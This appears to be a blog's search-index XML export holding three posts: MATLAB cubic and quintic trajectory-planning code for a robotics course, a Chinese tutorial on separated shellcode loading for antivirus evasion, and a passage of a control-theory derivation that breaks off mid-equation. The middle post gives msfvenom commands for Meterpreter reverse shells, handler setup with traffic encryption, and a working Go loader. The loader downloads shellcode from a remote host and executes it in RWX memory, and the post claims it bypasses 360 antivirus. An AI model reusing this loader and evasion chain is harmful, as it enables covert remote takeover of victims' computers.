<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>robotics section 7 matlab practice</title>
    <link href="/2025/06/05/robotics-section-7-matlab-practice/"/>
    <url>/2025/06/05/robotics-section-7-matlab-practice/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="robotics-section-7-matlab-practice">robotics section 7 matlabpractice</h1><h2 id="题目">题目</h2><figure><img src="/img/robotics-section-7-matlab-practice/p.png"alt="problem" /><figcaption aria-hidden="true">problem</figcaption></figure><h2 id="代码">代码</h2><h3 id="a">a</h3><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs matlab">clear<br><br><span class="hljs-comment">%定义已知量</span><br>syms theta_s theta_f t_f<br>theta_s=<span class="hljs-number">120</span>;<br>theta_f=<span class="hljs-number">60</span>;<br>t_f=<span class="hljs-number">1</span>;<br><br><span class="hljs-comment">%运用公式算出系数</span><br>a0=theta_s;<br>a1=<span class="hljs-number">0</span>;<br>a2=<span class="hljs-number">3</span>/t_f^<span class="hljs-number">2</span>*(theta_f-theta_s);<br>a3=<span class="hljs-number">-2</span>/t_f^<span class="hljs-number">3</span>*(theta_f-theta_s);<br><br><span class="hljs-comment">%得出多项式并多次求导</span><br>syms theta(t)<br>theta=a0+a1*t+a2*t^<span class="hljs-number">2</span>+a3*t^<span class="hljs-number">3</span><br>theta1=diff(theta)<br>theta2=diff(theta1)<br>theta3=diff(theta2)<br><br><span class="hljs-comment">%作图</span><br>subplot(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>)<br>fplot(theta,[<span class="hljs-number">0</span>,<span class="hljs-number">1</span>])<br>xlabel(<span class="hljs-string">&#x27;s&#x27;</span>)<br>ylabel(<span class="hljs-string">&#x27;deg&#x27;</span>)<br>title(<span class="hljs-string">&#x27;position&#x27;</span>)<br>subplot(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>)<br>fplot(theta1,[<span class="hljs-number">0</span>,<span class="hljs-number">1</span>])<br>xlabel(<span class="hljs-string">&#x27;s&#x27;</span>)<br>ylabel(<span class="hljs-string">&#x27;deg/s&#x27;</span>)<br>title(<span class="hljs-string">&#x27;velocity&#x27;</span>)<br>subplot(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>)<br>fplot(theta2,[<span class="hljs-number">0</span>,<span class="hljs-number">1</span>])<br>xlabel(<span class="hljs-string">&#x27;s&#x27;</span>)<br>ylabel(<span class="hljs-string">&#x27;deg/s^&#123;2&#125; &#x27;</span>)<br>title(<span class="hljs-string">&#x27;acceleration&#x27;</span>)<br>subplot(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">4</span>)<br>fplot(theta3,[<span class="hljs-number">0</span>,<span class="hljs-number">1</span>])<br>xlabel(<span class="hljs-string">&#x27;s&#x27;</span>)<br>ylabel(<span class="hljs-string">&#x27;deg/s^&#123;3&#125; &#x27;</span>)<br>title(<span class="hljs-string">&#x27;acceleration change rate&#x27;</span>)<br></code></pre></td></tr></table></figure><h3 id="b">b</h3><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs matlab">clear<br><br><span class="hljs-comment">%定义已知量</span><br>syms theta_s theta_f t_f theta_s_1 theta_f_1 theta_s_2 theta_f_2<br>theta_s=<span class="hljs-number">120</span>;<br>theta_f=<span class="hljs-number">60</span>;<br>theta_s_1=<span class="hljs-number">0</span>;<br>theta_f_1=<span class="hljs-number">0</span>;<br>theta_s_2=<span class="hljs-number">0</span>;<br>theta_f_2=<span class="hljs-number">0</span>;<br>t_f=<span class="hljs-number">1</span>;<br><br><span class="hljs-comment">%运用公式算出系数</span><br>a0=theta_s;<br>a1=theta_s_1;<br>a2=theta_s_2/<span class="hljs-number">2</span>;<br>a3=(<span class="hljs-number">20</span>*theta_f<span class="hljs-number">-20</span>*theta_s-(<span class="hljs-number">8</span>*theta_f_1+<span class="hljs-number">12</span>*theta_s_1)*t_f-(<span class="hljs-number">3</span>*theta_s_2-theta_f_2)*t_f^<span class="hljs-number">2</span>)/(<span class="hljs-number">2</span>*t_f^<span class="hljs-number">3</span>);<br>a4=(<span class="hljs-number">30</span>*theta_s<span class="hljs-number">-30</span>*theta_f+(<span class="hljs-number">14</span>*theta_f_1+<span class="hljs-number">16</span>*theta_s_1)*t_f+(<span class="hljs-number">3</span>*theta_s_2<span class="hljs-number">-2</span>*theta_f_2)*t_f^<span class="hljs-number">2</span>)/(<span class="hljs-number">2</span>*t_f^<span class="hljs-number">4</span>);<br>a5=(<span class="hljs-number">12</span>*theta_f<span class="hljs-number">-12</span>*theta_s-(<span class="hljs-number">6</span>*theta_f_1+<span class="hljs-number">6</span>*theta_s_1)*t_f-(theta_s_2-theta_f_2)*t_f^<span class="hljs-number">2</span>)/(<span class="hljs-number">2</span>*t_f^<span class="hljs-number">5</span>);<br><br><span class="hljs-comment">%得出多项式并多次求导</span><br>syms theta(t)<br>theta=a0+a1*t+a2*t^<span class="hljs-number">2</span>+a3*t^<span class="hljs-number">3</span>+a4*t^<span class="hljs-number">4</span>+a5*t^<span class="hljs-number">5</span><br>theta1=diff(theta)<br>theta2=diff(theta1)<br>theta3=diff(theta2)<br><br><span class="hljs-comment">%作图</span><br>subplot(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>)<br>fplot(theta,[<span class="hljs-number">0</span>,<span class="hljs-number">1</span>])<br>xlabel(<span class="hljs-string">&#x27;s&#x27;</span>)<br>ylabel(<span class="hljs-string">&#x27;deg&#x27;</span>)<br>title(<span class="hljs-string">&#x27;position&#x27;</span>)<br>subplot(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>)<br>fplot(theta1,[<span class="hljs-number">0</span>,<span class="hljs-number">1</span>])<br>xlabel(<span class="hljs-string">&#x27;s&#x27;</span>)<br>ylabel(<span class="hljs-string">&#x27;deg/s&#x27;</span>)<br>title(<span class="hljs-string">&#x27;velocity&#x27;</span>)<br>subplot(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>)<br>fplot(theta2,[<span class="hljs-number">0</span>,<span class="hljs-number">1</span>])<br>xlabel(<span class="hljs-string">&#x27;s&#x27;</span>)<br>ylabel(<span class="hljs-string">&#x27;deg/s^&#123;2&#125; &#x27;</span>)<br>title(<span class="hljs-string">&#x27;acceleration&#x27;</span>)<br>subplot(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">4</span>)<br>fplot(theta3,[<span class="hljs-number">0</span>,<span class="hljs-number">1</span>])<br>xlabel(<span class="hljs-string">&#x27;s&#x27;</span>)<br>ylabel(<span class="hljs-string">&#x27;deg/s^&#123;3&#125; &#x27;</span>)<br>title(<span class="hljs-string">&#x27;acceleration change rate&#x27;</span>)<br></code></pre></td></tr></table></figure><h3 id="c">c</h3><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs matlab">clear<br><br><span class="hljs-comment">%定义已知量</span><br>syms theta_s theta_v theta_f t1 t2<br>theta_s=<span class="hljs-number">60</span>;<br>theta_v=<span class="hljs-number">120</span>;<br>theta_f=<span class="hljs-number">30</span>;<br>t1=<span class="hljs-number">1</span>;<br>t2=<span class="hljs-number">1</span>;<br><br><span class="hljs-comment">%符号化为与书上公式相同</span><br>theta0=theta_s;<br>theta_g=theta_f;<br>t_f=t1;<br><br><span class="hljs-comment">%运用公式算出系数</span><br>a10=theta0;<br>a11=<span class="hljs-number">0</span>;<br>a12=(<span class="hljs-number">12</span>*theta_v<span class="hljs-number">-3</span>*theta_g<span class="hljs-number">-9</span>*theta0)/(<span class="hljs-number">4</span>*t_f^<span class="hljs-number">2</span>);<br>a13=(<span class="hljs-number">-8</span>*theta_v+<span class="hljs-number">3</span>*theta_g+<span class="hljs-number">5</span>*theta0)/(<span class="hljs-number">4</span>*t_f^<span class="hljs-number">3</span>);<br>a20=theta_v;<br>a21=(<span class="hljs-number">3</span>*theta_g<span class="hljs-number">-3</span>*theta0)/(<span class="hljs-number">4</span>*t_f);<br>a22=(<span class="hljs-number">-12</span>*theta_v+<span class="hljs-number">6</span>*theta_g+<span class="hljs-number">6</span>*theta0)/(<span class="hljs-number">4</span>*t_f^<span class="hljs-number">2</span>);<br>a23=(<span class="hljs-number">8</span>*theta_v<span class="hljs-number">-5</span>*theta_g<span class="hljs-number">-3</span>*theta0)/(<span class="hljs-number">4</span>*t_f^<span class="hljs-number">3</span>);<br><br><span class="hljs-comment">%得出两个多项式，并将其连接，然后求导</span><br>syms theta(t)<br>theta=piecewise(<span class="hljs-number">0</span>&lt;=t&lt;t1,a10+a11*t+a12*t^<span class="hljs-number">2</span>+a13*t^<span class="hljs-number">3</span>,t1&lt;=t&lt;=t1+t2,a20+a21*(t-t1)+a22*(t-t1)^<span class="hljs-number">2</span>+a23*(t-t1)^<span class="hljs-number">3</span>)<br>theta1=diff(theta)<br>theta2=diff(theta1)<br>theta3=diff(theta2)<br><br><span class="hljs-comment">%作图</span><br>subplot(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>)<br>fplot(theta,[<span class="hljs-number">0</span>,<span class="hljs-number">2</span>])<br>xlabel(<span class="hljs-string">&#x27;s&#x27;</span>)<br>ylabel(<span class="hljs-string">&#x27;deg&#x27;</span>)<br>title(<span class="hljs-string">&#x27;position&#x27;</span>)<br>subplot(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>)<br>fplot(theta1,[<span class="hljs-number">0</span>,<span class="hljs-number">2</span>])<br>xlabel(<span class="hljs-string">&#x27;s&#x27;</span>)<br>ylabel(<span class="hljs-string">&#x27;deg/s&#x27;</span>)<br>title(<span class="hljs-string">&#x27;velocity&#x27;</span>)<br>subplot(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>)<br>fplot(theta2,[<span class="hljs-number">0</span>,<span class="hljs-number">2</span>])<br>xlabel(<span class="hljs-string">&#x27;s&#x27;</span>)<br>ylabel(<span class="hljs-string">&#x27;deg/s^&#123;2&#125; &#x27;</span>)<br>title(<span class="hljs-string">&#x27;acceleration&#x27;</span>)<br>subplot(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">4</span>)<br>fplot(theta3,[<span class="hljs-number">0</span>,<span class="hljs-number">2</span>])<br>xlabel(<span class="hljs-string">&#x27;s&#x27;</span>)<br>ylabel(<span class="hljs-string">&#x27;deg/s^&#123;3&#125; &#x27;</span>)<br>title(<span class="hljs-string">&#x27;acceleration change rate&#x27;</span>)<br></code></pre></td></tr></table></figure><h3 id="d">d</h3><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs matlab">clear<br><br>theta_s=<span class="hljs-number">120</span>;<br>theta_f=<span class="hljs-number">60</span>;<br>t_f=<span class="hljs-number">1</span>;<br>steps=<span class="hljs-number">100</span>;<span class="hljs-comment">%点个数为100</span><br>[q,qd,qdd]=jtraj(theta_s,theta_f,steps);<br>t=<span class="hljs-built_in">linspace</span>(<span class="hljs-number">0</span>,t_f,steps)&#x27;;<br>qddd=diff(qdd)./diff(t);<span class="hljs-comment">%用做差相除求加速度变化率</span><br><br><span class="hljs-comment">%作图</span><br>subplot(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>)<br><span class="hljs-built_in">plot</span>(t,q)<br>xlabel(<span class="hljs-string">&#x27;s&#x27;</span>)<br>ylabel(<span class="hljs-string">&#x27;deg&#x27;</span>)<br>title(<span class="hljs-string">&#x27;position&#x27;</span>)<br>subplot(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>)<br><span class="hljs-built_in">plot</span>(t,qd)<br>xlabel(<span class="hljs-string">&#x27;s&#x27;</span>)<br>ylabel(<span class="hljs-string">&#x27;deg/s&#x27;</span>)<br>title(<span class="hljs-string">&#x27;velocity&#x27;</span>)<br>subplot(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>)<br><span class="hljs-built_in">plot</span>(t,qdd)<br>xlabel(<span class="hljs-string">&#x27;s&#x27;</span>)<br>ylabel(<span class="hljs-string">&#x27;deg/s^&#123;2&#125; &#x27;</span>)<br>title(<span class="hljs-string">&#x27;acceleration&#x27;</span>)<br>subplot(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">4</span>)<br><span class="hljs-built_in">plot</span>(t(<span class="hljs-number">1</span>:<span class="hljs-keyword">end</span><span class="hljs-number">-1</span>),qddd)<br>xlabel(<span class="hljs-string">&#x27;s&#x27;</span>)<br>ylabel(<span class="hljs-string">&#x27;deg/s^&#123;3&#125; &#x27;</span>)<br>title(<span class="hljs-string">&#x27;acceleration change rate&#x27;</span>)<br></code></pre></td></tr></table></figure><h2 id="结果">结果</h2><p><img src="/img/robotics-section-7-matlab-practice/a0.png" alt="a0" /><img src="/img/robotics-section-7-matlab-practice/a1.png"alt="a1" /></p><p><img src="/img/robotics-section-7-matlab-practice/b0.png" alt="b0" /><img src="/img/robotics-section-7-matlab-practice/b1.png"alt="b1" /></p><p><img src="/img/robotics-section-7-matlab-practice/c0.png" alt="c0" /><img src="/img/robotics-section-7-matlab-practice/c1.png"alt="c1" /></p><figure><img src="/img/robotics-section-7-matlab-practice/d.png" alt="d" /><figcaption aria-hidden="true">d</figcaption></figure>]]></content>
    
    
    <categories>
      
      <category>控制</category>
      
    </categories>
    
    
    <tags>
      
      <tag>理论</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>golang加载msf shellcode分离免杀</title>
    <link href="/2025/06/05/golang%E5%8A%A0%E8%BD%BDmsf-shellcode%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80/"/>
    <url>/2025/06/05/golang%E5%8A%A0%E8%BD%BDmsf-shellcode%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="golang加载msf-shellcode分离免杀">golang加载msfshellcode分离免杀</h1><h2 id="生成shellcode">1 生成shellcode</h2><p>使用<code>msfvenom</code>生成shellcode</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">msfvenom -p windows/x64/meterpreter/reverse_https lhost=x lport=x -f c<br></code></pre></td></tr></table></figure><p>经测试不对shellcode进行编码也可免杀。</p><h2 id="配置msfconsole">2 配置msfconsole</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sh">msfconsole<br>use exploit/multi/handler<br><span class="hljs-built_in">set</span> paylaod windows/x64/meterpreter/reverse_https<br><span class="hljs-built_in">set</span> lhost x<br><span class="hljs-built_in">set</span> lport x<br><span class="hljs-built_in">set</span> EnableStageEncoding <span class="hljs-literal">true</span><br><span class="hljs-built_in">set</span> stageencoder x64/xor_dynamic<br><span class="hljs-built_in">set</span> stageencodingfallback <span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure><p>使用<code>reverse_https</code>效果较好</p><p>其中</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">set</span> EnableStageEncoding <span class="hljs-literal">true</span><br><span class="hljs-built_in">set</span> stageencoder x64/xor_dynamic<br><span class="hljs-built_in">set</span> stageencodingfallback <span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure><p>是对流量进行加密，也可使用<code>reverse_tcp_rc4</code>而且不用设置<code>stageencoder</code>选项。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">msfvenom -p  windows/x64/meterpreter/reverse_tcp_rc4  lhost=x lport=x RC4PASSWORD=pswd  -f c<br></code></pre></td></tr></table></figure><p>利用rc4对传输的数据进行加密，密钥在生成时指定，在监听的服务端设置相同的密钥。</p><p>将生成的shellcode部署到kali并开启apache2服务：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">touch</span> /var/www/html/1.html<br>service apache2 start<br></code></pre></td></tr></table></figure><p>将生成的shellcode复制到1.html文件。</p><p>另外关于外网访问问题，可以使用frp+vps的方式解决在此不再赘述。</p><p>附上相关链接: <em><ahref="https://blog.csdn.net/monster663/article/details/126797109">frp内网穿透—将kali代理在公网中进行渗透测试</a></em></p><h2 id="golang远程加载shellcode">3 golang远程加载shellcode</h2><p>代码如下：</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;encoding/hex&quot;</span><br><span class="hljs-string">&quot;io/ioutil&quot;</span><br><span class="hljs-string">&quot;net/http&quot;</span><br><span class="hljs-string">&quot;syscall&quot;</span><br><span class="hljs-string">&quot;unsafe&quot;</span><br>)<br><br><span class="hljs-keyword">const</span> (<br>MEM_COMMIT             = <span class="hljs-number">0x1000</span><br>MEM_RESERVE            = <span class="hljs-number">0x2000</span><br>PAGE_EXECUTE_READWRITE = <span class="hljs-number">0x40</span><br>)<br><br><span class="hljs-keyword">var</span> (<br>kernel32      = syscall.MustLoadDLL(<span class="hljs-string">&quot;kernel32.dll&quot;</span>)<br>ntdll         = syscall.MustLoadDLL(<span class="hljs-string">&quot;ntdll.dll&quot;</span>)<br>VirtualAlloc  = kernel32.MustFindProc(<span class="hljs-string">&quot;VirtualAlloc&quot;</span>)<br>RtlCopyMemory = ntdll.MustFindProc(<span class="hljs-string">&quot;RtlCopyMemory&quot;</span>)<br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>shellcodeBuf, err := GetShellCode()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-built_in">panic</span>(err)<br>&#125;<br>execute(shellcodeBuf)<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">GetShellCode</span><span class="hljs-params">()</span></span> (<span class="hljs-type">string</span>, <span class="hljs-type">error</span>) &#123;<br>resp, err := http.Get(<span class="hljs-string">&quot;http://x/1.html&quot;</span>)<span class="hljs-comment">//即kali主机地址</span><br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>, err<br>&#125;<br><span class="hljs-keyword">defer</span> resp.Body.Close()<br>shellcodeBuf, err := ioutil.ReadAll(resp.Body)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>, err<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-type">string</span>(shellcodeBuf), <span class="hljs-literal">nil</span><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">execute</span><span class="hljs-params">(shellcodeBuf <span class="hljs-type">string</span>)</span></span> <span class="hljs-type">error</span> &#123;<br>shellcode, err := hex.DecodeString(shellcodeBuf)<br>addr, _, err := VirtualAlloc.Call(<span class="hljs-number">0</span>, <span class="hljs-type">uintptr</span>(<span class="hljs-built_in">len</span>(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)<br>RtlCopyMemory.Call(<br>addr,<br><span class="hljs-type">uintptr</span>(unsafe.Pointer(&amp;shellcode[<span class="hljs-number">0</span>])),<br><span class="hljs-type">uintptr</span>(<span class="hljs-built_in">len</span>(shellcode)),<br>)<br>syscall.Syscall(addr, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><p>经测试，可绕过360静态检测和动态监测，成功上线。</p>]]></content>
    
    
    <categories>
      
      <category>penetration</category>
      
    </categories>
    
    
    <tags>
      
      <tag>shellcode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pole assignment &amp; lqr tracking simulation for modern control theory</title>
    <link href="/2025/06/04/pole-assignment-lqr-tracking-simulation-for-modern-control-theory/"/>
    <url>/2025/06/04/pole-assignment-lqr-tracking-simulation-for-modern-control-theory/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1id="pole-assignment-lqr-tracking-simulation-for-modern-control-theory">poleassignment &amp; lqr tracking simulation for modern control theory</h1><h2 id="题目要求">0 题目要求</h2><p>假设在惯性坐标系下移动机器人的坐标为<spanclass="math inline">\(O=(x,y,θ)^T\)</span>，参考机器人的坐标为<spanclass="math inline">\(q_r=(x_r,y_r,θ_r)^T\)</span>，跟踪误差坐标在载体坐标系下的坐标为<spanclass="math inline">\(p_e=(x_e,y_e,θ_e)^T\)</span>。</p><p>（1）通过载体坐标系旋转变换以及图1的几何关系试建立移动机器人跟踪误差线性状态空间模型。</p><p>（2）如果参考机器人轨迹是一个半径<spanclass="math inline">\(2\)</span>米的圆，参考线速度为<spanclass="math inline">\(0.4\)</span>米/秒，参考角速度为<spanclass="math inline">\(0.5\)</span>弧度/秒，试设计一个稳定化的状态反馈控制器，使得系统的超调量<spanclass="math inline">\(\le 4 \%\)</span>，调节时间<spanclass="math inline">\(\le5\)</span>秒，并用MATLAB给出响应曲线(按<spanclass="math inline">\(2\%\)</span>准则)。</p><p>（3）在相同的参数下设计LQR控制器，并用MATLAB给出响应曲线。</p><figure><imgsrc="/img/pole-assignment-lqr-tracking-simulation-for-modern-control-theory/model.png"alt="图1" /><figcaption aria-hidden="true">图1</figcaption></figure><h2 id="推导">1 推导</h2><h3 id="定义坐标与误差">1.1 定义坐标与误差</h3><p>实际机器人在世界坐标系下的状态：</p><p><span class="math display">\[q = \begin{bmatrix}x \\y \\\theta\end{bmatrix}\]</span></p><p>参考轨迹的状态：</p><p><span class="math display">\[q_r = \begin{bmatrix}x_r \\y_r \\\theta_r\end{bmatrix}\]</span></p><p>跟踪误差坐标在参考机器人坐标系下定义为：</p><p><span class="math display">\[p_e = \begin{bmatrix}x_e \\y_e \\\theta_e\end{bmatrix} = \begin{bmatrix}x - x_r \\y - y_r \\\theta - \theta_r\end{bmatrix}\]</span></p><h3 id="坐标变换推导">1.2 坐标变换推导</h3><p>利用旋转矩阵： <span class="math display">\[R_r = \begin{bmatrix}\cos\theta_r &amp; \sin\theta_r &amp; 0 \\-\sin\theta_r &amp; \cos\theta_r &amp; 0 \\0 &amp; 0 &amp; 1\end{bmatrix}\]</span>可以将实际机器人坐标系下的状态转换到参考机器人坐标系下的跟踪误差坐标：</p><p><span class="math display">\[p_e = \begin{bmatrix}x_e \\y_e \\\theta_e\end{bmatrix} = \begin{bmatrix}cos\theta_r(x - x_r) + sin\theta_r(y - y_r)\\-sin\theta_r(x - x_r) + cos\theta_r(y - y_r) \\\theta - \theta_r\end{bmatrix}\]</span></p><h3 id="机器人运动学模型">1.3 机器人运动学模型</h3><p>定义机器人人动力学模型。</p><p>定义实际机器人状态：</p><p><span class="math display">\[\left\{\begin{aligned}\dot{x} &amp;= v \cos\theta \\\dot{y} &amp;= v \sin\theta \\\dot{\theta} &amp;= \omega\end{aligned}\right.\]</span></p><p>定义参考机器人状态：</p><p><span class="math display">\[\left\{\begin{aligned}\dot{x}_r &amp;= v_r \cos\theta_r \\\dot{y}_r &amp;= v_r \sin\theta_r \\\dot{\theta}_r &amp;= \omega_r\end{aligned}\right.\]</span></p><h3 id="误差状态空间模型">1.4 误差状态空间模型</h3><p>对<span class="math inline">\(x_e\)</span>，<spanclass="math inline">\(y_e\)</span>，<spanclass="math inline">\(\theta_e\)</span>分别求导。</p><p>对于<span class="math inline">\(x_e\)</span>：</p><p><span class="math display">\[\begin{aligned}\dot{x}_e &amp;= \frac{d}{dt}[cos\theta_r(x - x_r) + sin\theta_r(y -y_r)] \\&amp;= -sin\theta_r \dot{\theta}_r (x - x_r) + cos\theta_r (\dot{x} -\dot{x}_r) + cos\theta_r 